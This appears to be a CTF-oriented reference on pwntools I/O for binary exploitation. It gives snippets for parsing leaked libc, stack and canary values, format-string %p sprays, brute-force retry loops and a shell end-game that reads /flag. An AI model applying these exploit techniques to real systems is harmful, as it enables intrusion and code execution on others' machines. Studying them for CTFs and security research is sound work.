# Tube I/O patterns and leak parsing

## Golden rules

1. **Anchor before you send.** Never `sendline` blind; always
   `sendlineafter(prompt, data)` or `recvuntil(prompt)` first. Blind sends race
   the target's reads and produce flaky exploits that "work locally".
2. **`send` vs `sendline`.** If the target does `read(0, buf, N)` with no line
   discipline, `sendline`'s trailing `\n` lands in the NEXT read and desyncs the
   protocol. Use `send()` for exact-size reads; pad to N if the program expects
   exactly N bytes.
3. **Drain before critical reads.** `p.clean(timeout=0.5)` before a leak read
   kills stale banner bytes that would corrupt `u64()`.
4. **Debug with `context.log_level = "debug"`** — it hexdumps every byte both
   ways. Diff a working local run against the remote transcript.
5. **Log everything:** `context.log_file = "runs/io-$(target).log"` — this
   transcript is your evidence artifact.

## Leak-parsing recipes

### Raw pointer printed by puts (64-bit)

puts stops at the first NUL; a userland address is 6 significant bytes:

```python
p.recvuntil(b"gift: ")                   # if there's a label — best case
leak = u64(p.recvline(keepends=False).ljust(8, b"\x00"))
```

No label? Leak lands immediately after your overflow echo:

```python
p.recvuntil(payload[-8:])                # sync on the tail of what you sent
leak = u64(p.recvn(6) + b"\x00\x00")
```

### Hex-formatted leak

```python
leak = int(p.recvregex(rb"0x[0-9a-f]+", capture=True).group(0), 16)
leak = int(p.recvline(), 16)                       # bare hex line
leak = int(p.recvuntil(b"\n", drop=True), 10)      # decimal
```

### %p format-string spray

```python
p.sendline(b"|".join(b"%%%d$p" % i for i in range(1, 20)))
vals = [int(x, 16) if x != b"(nil)" else 0
        for x in p.recvline(keepends=False).split(b"|")]
```

Classify each value: `0x7f...` ending in canonical libc offsets → libc pointer;
`0x7ff...e...` → stack; low `0x55.../0x56...` → PIE code; a value ending in
`00` with high entropy and 64-bit width → stack canary (always ends in `\x00`).

### Canary + saved RBP + return address from one over-read

```python
p.recvuntil(b"A" * 88)                   # echo of the padding
blob = p.recvn(24)
canary   = u64(blob[0:8])
saved_rbp = u64(blob[8:16])
ret_addr  = u64(blob[16:24])
elf.address = ret_addr - KNOWN_RET_OFFSET
```

### Sanity checks (do them every time)

```python
assert libc.address & 0xfff == 0, hex(libc.address)   # page aligned or wrong symbol
assert (leak >> 40) in (0x7f, 0x7e), hex(leak)        # plausible libc/stack ptr
```

A misaligned "base" means wrong libc build → hand the leak's low 12 bits to the
`libc-identification` skill.

## Menu-driven binaries

Wrap the protocol once, exploit in terms of primitives:

```python
def alloc(idx, size, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"data: ", data)

def free(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())

def show(idx) -> bytes:
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx: ", str(idx).encode())
    return p.recvline(keepends=False)
```

## Timeouts, EOF, and flaky remotes

```python
data = p.recv(timeout=2)         # b"" on timeout — check it
try:
    p.recvuntil(b"never-arrives", timeout=3)
except EOFError:
    log.failure("target died — likely bad chain / wrong offset")

# Retry loop for bruteforce (canary byte-by-byte, ASLR 1/16, etc.):
while True:
    p = start()
    try:
        attempt(p)
        break
    except EOFError:
        p.close()
```

Remote timing differs from local: the remote may batch output, so a single
`recvline` locally can need `recvuntil` remotely. Make all reads delimiter-based
and the script works in both.

## Interactive end-game

```python
p.sendline(b"id; cat /flag*")    # queue commands before interactive if the
p.interactive()                  # shell might be unstable
```

If `interactive()` shows nothing, the shell may have no PTY buffering —
`p.sendline(b"echo PWNED")` and look for the echo; or stabilize with
`p.sendline(b"exec /bin/sh -i 2>&1")`.
